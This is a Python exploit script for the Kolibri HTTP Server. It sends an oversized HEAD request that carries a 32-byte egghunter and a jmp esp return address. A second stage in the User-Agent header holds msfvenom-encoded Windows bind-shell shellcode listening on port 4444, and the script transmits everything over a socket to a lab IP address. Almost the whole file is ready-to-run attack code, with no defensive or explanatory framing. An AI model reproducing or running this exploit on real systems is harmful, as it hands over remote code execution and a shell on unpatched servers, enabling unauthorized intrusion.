#!/usr/bin/python

import socket
import os
import sys

banner = """
#----------------------------------------------#
Kolibri HTTP Server Exploit - Egghunter
#----------------------------------------------#
"""

print banner

#Egghunter
#Size 32-bytes
#use mona -> !mona egg -t b33f -> "b33fb33f"
hunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x62\x33" #b3
"\x33\x66\x8b\xfa" #3f
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/alpha_mixed -f c
shellcode = ("\x89\xe1\xda\xc8\xd9\x71\xf4\x5b\x53\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x39\x6c\x49\x78\x4d\x52\x35\x50\x73\x30\x47\x70\x71\x70\x4e"
"\x69\x38\x65\x66\x51\x39\x50\x45\x34\x6e\x6b\x30\x50\x66\x50"
"\x6e\x6b\x56\x32\x66\x6c\x6c\x4b\x50\x52\x45\x44\x6e\x6b\x70"
"\x72\x34\x68\x66\x6f\x78\x37\x71\x5a\x64\x66\x55\x61\x59\x6f"
"\x4c\x6c\x67\x4c\x65\x31\x71\x6c\x37\x72\x34\x6c\x61\x30\x79"
"\x51\x68\x4f\x34\x4d\x35\x51\x38\x47\x78\x62\x38\x72\x70\x52"
"\x52\x77\x6e\x6b\x73\x62\x42\x30\x4c\x4b\x63\x7a\x47\x4c\x4e"
"\x6b\x42\x6c\x42\x31\x32\x58\x39\x73\x42\x68\x57\x71\x38\x51"
"\x46\x31\x6e\x6b\x36\x39\x35\x70\x56\x61\x6e\x33\x6c\x4b\x72"
"\x69\x36\x78\x39\x73\x44\x7a\x62\x69\x6e\x6b\x44\x74\x6c\x4b"
"\x47\x71\x6b\x66\x65\x61\x39\x6f\x4c\x6c\x49\x51\x38\x4f\x64"
"\x4d\x57\x71\x7a\x67\x36\x58\x69\x70\x42\x55\x58\x76\x66\x63"
"\x31\x6d\x4b\x48\x67\x4b\x51\x6d\x35\x74\x64\x35\x38\x64\x31"
"\x48\x4c\x4b\x32\x78\x77\x54\x65\x51\x5a\x73\x63\x56\x6c\x4b"
"\x34\x4c\x30\x4b\x6c\x4b\x61\x48\x55\x4c\x77\x71\x6a\x73\x4c"
"\x4b\x73\x34\x6e\x6b\x53\x31\x4a\x70\x4b\x39\x72\x64\x34\x64"
"\x55\x74\x51\x4b\x43\x6b\x33\x51\x63\x69\x70\x5a\x72\x71\x69"
"\x6f\x39\x70\x61\x4f\x43\x6f\x72\x7a\x6e\x6b\x54\x52\x7a\x4b"
"\x4e\x6d\x73\x6d\x53\x58\x50\x33\x67\x42\x57\x70\x63\x30\x42"
"\x48\x42\x57\x52\x53\x37\x42\x71\x4f\x50\x54\x72\x48\x72\x6c"
"\x74\x37\x76\x46\x76\x67\x69\x6f\x39\x45\x6c\x78\x6e\x70\x33"
"\x31\x67\x70\x37\x70\x66\x49\x4f\x34\x52\x74\x46\x30\x55\x38"
"\x54\x69\x4b\x30\x70\x6b\x65\x50\x79\x6f\x6b\x65\x42\x4a\x36"
"\x68\x32\x79\x76\x30\x68\x62\x6b\x4d\x51\x50\x32\x70\x43\x70"
"\x32\x70\x71\x78\x7a\x4a\x56\x6f\x59\x4f\x6b\x50\x4b\x4f\x79"
"\x45\x6d\x47\x70\x68\x67\x72\x67\x70\x57\x61\x51\x4c\x6c\x49"
"\x7a\x46\x62\x4a\x32\x30\x63\x66\x70\x57\x75\x38\x49\x52\x4b"
"\x6b\x56\x57\x43\x57\x39\x6f\x58\x55\x61\x47\x42\x48\x6e\x57"
"\x59\x79\x54\x78\x4b\x4f\x69\x6f\x4a\x75\x72\x77\x53\x58\x62"
"\x54\x68\x6c\x67\x4b\x48\x61\x4b\x4f\x4b\x65\x76\x37\x6d\x47"
"\x72\x48\x53\x45\x42\x4e\x42\x6d\x71\x71\x59\x6f\x7a\x75\x61"
"\x78\x52\x43\x52\x4d\x71\x74\x57\x70\x4c\x49\x48\x63\x56\x37"
"\x33\x67\x56\x37\x45\x61\x48\x76\x30\x6a\x42\x32\x56\x39\x43"
"\x66\x4d\x32\x79\x6d\x70\x66\x78\x47\x71\x54\x66\x44\x57\x4c"
"\x37\x71\x57\x71\x6c\x4d\x73\x74\x34\x64\x76\x70\x7a\x66\x67"
"\x70\x43\x74\x76\x34\x66\x30\x62\x76\x61\x46\x32\x76\x30\x46"
"\x33\x66\x30\x4e\x50\x56\x72\x76\x76\x33\x46\x36\x32\x48\x42"
"\x59\x68\x4c\x75\x6f\x4e\x66\x4b\x4f\x5a\x75\x6c\x49\x4d\x30"
"\x70\x4e\x72\x76\x73\x76\x39\x6f\x76\x50\x65\x38\x54\x48\x4f"
"\x77\x55\x4d\x31\x70\x79\x6f\x38\x55\x6f\x4b\x6c\x30\x68\x35"
"\x4f\x52\x61\x46\x52\x48\x6f\x56\x6d\x45\x6f\x4d\x6d\x4d\x49"
"\x6f\x4b\x65\x35\x6c\x64\x46\x51\x6c\x65\x5a\x4f\x70\x39\x6b"
"\x79\x70\x44\x35\x43\x35\x6f\x4b\x61\x57\x56\x73\x52\x52\x50"
"\x6f\x62\x4a\x45\x50\x71\x43\x49\x6f\x5a\x75\x41\x41"
)

#jmp esp added from 0x77c35459 from msvcrt.dll and jump back 60
Stage1 = "A"*478 + hunter + "A"*5 + "\x59\x54\xC3\x77" + "\xEB\xC4"
#hunter + shellcode
Stage2 = "b33fb33f" + shellcode

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 172.16.73.129:8080\r\n"
"User-Agent: " + Stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("172.16.73.129", 8080))
expl.send(buffer)

launchsploit = """
#----------------------------------------------#
Kolibri Exploit Launched
#----------------------------------------------#
"""

print launchsploit

expl.close()